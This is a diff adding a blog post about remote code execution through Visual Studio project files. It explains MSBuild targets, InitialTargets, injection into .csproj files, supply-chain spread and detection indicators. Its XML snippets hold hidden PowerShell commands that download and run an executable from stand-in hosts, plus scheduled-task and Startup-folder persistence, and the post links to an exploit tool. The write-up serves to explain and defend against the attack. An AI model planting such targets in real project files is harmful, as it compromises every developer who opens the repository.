@@ -1,0 +1,94 @@
+export const metadata = {
+  title: 'Visual Studio = Malware?',
+  date: '2025.03.27',
+  description: 'Visual Studio project file remote code execution',
+}
+
+# Visual Studio = Malware?
+
+Visual Studio project files function as executable MSBuild scripts that run code immediately upon load. While developers treat `.csproj` and `.vbproj` files as static configuration describing dependencies, the format simultaneously serves as a dynamic build definition capable of arbitrary command execution.
+
+The format defines build instructions as XML, and MSBuild evaluates them when the project opens to populate the solution explorer. Since projects often require custom tasks during compilation, the schema permits executable code by design.
+
+When a user clones a repository and opens the solution, Visual Studio loads every project file and MSBuild parses them. If a malicious target exists in the XML, it executes before any source code is reviewed.
+
+## Target Execution
+
+MSBuild organizes work into targets. A target contains one or more tasks that run sequentially:
+```xml
+<Target Name="BeforeBuild">
+  <Exec Command="powershell -windowstyle hidden -command wget [http://attacker.com/payload.exe](http://attacker.com/payload.exe) -o $env:TEMP\update.exe" />
+  <Exec Command="powershell -windowstyle hidden -command start $env:TEMP\update.exe" />
+</Target>
+```
+
+The `<Exec>` task spawns a shell command to download and run an executable. Both commands use `-windowstyle hidden` to prevent console windows from appearing.
+
+Standard project files define targets for building, cleaning, and packaging. They import Microsoft's build targets which define the actual compilation process:
+```xml
+<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+```
+
+This import brings in hundreds of targets. The BeforeBuild target is a well-known extension point, allowing custom logic to run before compilation starts.
+
+The `InitialTargets` attribute forces execution when the project loads:
+```xml
+<Project ToolsVersion="15.0" InitialTargets="Build" xmlns="[http://schemas.microsoft.com/developer/msbuild/2003](http://schemas.microsoft.com/developer/msbuild/2003)">
+```
+
+Setting `InitialTargets="Build"` makes MSBuild evaluate the Build target immediately. If your Build target or any of its dependencies contain malicious commands, they execute as soon as Visual Studio opens the file.
+
+## Injection Mechanics
+
+Project files are XML. Injection means inserting valid MSBuild syntax into an existing project. Standard projects end with an Import statement followed by the closing Project tag:
+```xml
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
+```
+
+Adding a target before that closing tag enables execution:
+```xml
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Target Name="BeforeBuild">
+    <Exec Command="powershell -command ..." />
+  </Target>
+</Project>
+```
+
+The target name can be anything, but BeforeBuild integrates with the existing build workflow. Combined with `InitialTargets="Build"`, execution occurs on project load without requiring an actual build.
+
+Multiple Exec tasks run in sequence:
+```xml
+<Target Name="BeforeBuild">
+  <Exec Command="powershell -command $p='$env:TEMP\svc.exe'; wget [http://cdn.example.com/update.exe](http://cdn.example.com/update.exe) -o $p" />
+  <Exec Command="powershell -command start $env:TEMP\svc.exe" />
+  <Exec Command="schtasks /create /tn WindowsUpdate /tr $env:TEMP\svc.exe /sc minute /mo 10 /f" />
+  <Exec Command="powershell -command copy $env:TEMP\svc.exe $env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\svc.exe" />
+</Target>
+```
+
+Download, execute, schedule, persist. Each command completes before the next runs. If any command fails, MSBuild logs it but continues processing, meaning the user might see build warnings while the payload has already executed.
+
+## Supply Chain Propagation
+
+Project files reside in version control alongside source files. A single poisoned project file impacts everyone who clones the repository. Unlike package poisoning, which requires compromising a published artifact, project file poisoning requires only commit access to a repository.
+
+<BlockSideTitle title={<>
+  Compromising a single software provider or repository reaches every downstream developer and organization that depends on it.
+</>}>
+<div className="framed">![Supply Chain Attack Diagram](supply-chain-attack.png)</div>
+</BlockSideTitle>
+
+Example repositories act as effective vectors because developers clone them specifically to learn or copy code. A poisoned project file in an example repository executes on thousands of machines.
+
+The 2021 North Korean campaign targeted security researchers using this exact vector. Attackers shared Visual Studio projects containing legitimate exploit code for research, but the project files themselves contained malicious targets.
+
+## Detection Surface
+
+Project files are plaintext XML. Inspecting them manually reveals the malicious targets, yet developers rarely inspect project files with the same rigor as source code.
+
+Indicators include the `InitialTargets` attribute on the root element, `BeforeBuild` targets containing PowerShell execution, or `Exec` tasks downloading from external URLs.
+
+Security tools generally whitelist MSBuild as a trusted binary, so the commands it spawns appear legitimate. If you treat build files as configuration rather than code, you grant the build environment implicit permission to compromise itself.
+
+Source code at: [github.com/Meltedd/VisualSploit](https://github.com/Meltedd/VisualSploit)
